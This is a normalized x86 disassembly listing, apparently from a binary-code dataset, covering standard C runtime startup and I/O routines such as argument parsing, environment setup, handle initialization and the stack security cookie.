mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40c6e0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40c720
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c82c
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_40c852
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40c82c
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
push 0x3
call sub_4121b8
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_4121b8
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_412155
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_407a30
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_40c576
push esi
call sub_41213a
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_412155
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_411ff8
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_41213a
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_41206d
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_411ff8
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_411e8c
add esp 0xc
jmp r-xdata
sub_40ca01
push 0x3
call sub_4121b8
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40c852
push 0xff
call sub_40c852
pop ecx
pop ecx
push 0x3
call sub_4121b8
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40ca3a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40b088
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40ca8a
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40bd18
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_409f5e
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_407a30
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_407a30
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_408a41
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_409f5e
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_408a41
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40ae37
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40c576
int3
add edi 0x4
sub_40cb66
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_41224a
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_41224a
pop ecx
test eax eax
je r-xdata
call sub_41224a
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_40cd00
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_40bd18
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40cb66
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_409f19
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40cb66
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40cdbb
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_409f19
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_408a41
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_40ce52
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_409f5e
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_409f5e
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_40d0b5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40d150
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_411e7b
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_411e7b
pop ecx
sub_40d262
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_40c61a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_40c5c8
mov eax esi
jmp r-xdata
sub_40d317
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
pop ebp
retn
sub_40d35c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40d608
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_40d47e
pop ecx
push eax
call sub_412819
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_40d47e
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_40d47e
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_40d47e
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40d47e
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_40d47e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
pop ebp
retn
sub_40d4a4
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40d47e
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_40c61a
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_40c61a
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_408dc2
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_40ddea
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_41290f
pop ecx
test eax eax
jne r-xdata
call sub_408dc2
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_40ddea
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40d608
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_40e404
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_40d608
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_409f19
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40d651
push 0x10
push r--data
call sub_40be80
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d6e4
mov eax [ ebp - 0x1c ]
call sub_40bec5
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_4096b7
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_408a41
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40d6ed
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_412b30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_40c62d
mov [ eax ] edi
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_407abb
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
jmp r-xdata
push esi
call sub_41290f
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_40e37f
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_4072c1
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
